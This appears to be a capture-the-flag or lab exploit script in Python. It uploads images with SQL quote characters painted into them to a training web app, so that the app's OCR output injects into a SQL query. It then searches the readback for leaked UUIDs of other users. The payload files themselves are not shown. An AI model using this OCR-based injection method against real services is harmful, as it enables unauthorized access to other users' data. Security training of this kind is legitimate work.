# test_dq.py — 1) parity test with SELECT-context quotes to see if quotes EVER break SQL,
#              2) fire the real payload (quotes painted doubled) and look for a leaked uuid.
import requests, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def up(datauri_file, desc):
    uri = open(datauri_file).read().strip()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return r.status_code

print("== parity with SELECT-context (does a quote ever break the query?) ==")
print("odd (3 quotes)  ->", up("dtq_odd_datauri.txt","DTQ_odd"))
print("even (2 quotes) ->", up("dtq_even_datauri.txt","DTQ_even"))

print("\n== real payload (quotes painted doubled) ==")
print("dqpay ->", up("dqpay_datauri.txt","DQPAY"))

print("\n== readback ==")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    d = img.get("description","")
    if d in ("DTQ_odd","DTQ_even","DQPAY"):
        print(f"{d:10} ocr={img.get('summary_ocr')!r}")
for img in data:
    for m in UURE.findall(str(img.get("summary_ocr",""))):
        if m != UID:
            print(f"  >>> LEAKED uuid in id={img['id']}: {m}")
